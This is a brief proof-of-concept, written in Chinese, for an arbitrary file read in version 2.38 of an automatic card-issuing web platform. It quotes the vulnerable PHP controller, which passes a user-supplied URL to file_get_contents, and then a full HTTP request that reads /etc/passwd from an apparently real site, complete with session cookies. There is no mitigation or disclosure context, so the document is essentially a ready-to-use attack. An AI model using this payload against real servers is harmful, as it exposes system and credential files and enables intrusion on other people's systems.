自动发卡平台V2.38任意文件读取 POC

application\wechat\controller\Review.php

```php
/**
 * 微信图片显示
 */
public function img()
{
    $url = $this->request->get('url', '');
    $filename = FileService::getFileName($url, 'jpg', 'tmp/');
    if (false === ($img = FileService::getFileUrl($filename))) {
        $info = FileService::save($filename, file_get_contents($url));
        $img = (is_array($info) && isset($info['url'])) ? $info['url'] : $url;
    }
    $this->redirect($img);
}
```



```
GET /wechat/review/img?url=/etc/passwd HTTP/1.1
Host: www.sherouxi.com
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: se56b9383=ctqn15q8vvuq5gf9lhsjcpaag2; UM_distinctid=1756e4f835f184-0eccd8e7aea2e1-6373664-1fa400-1756e4f836028c; CNZZDATA1261189048=1810876947-1603873506-%7C1603948676


```
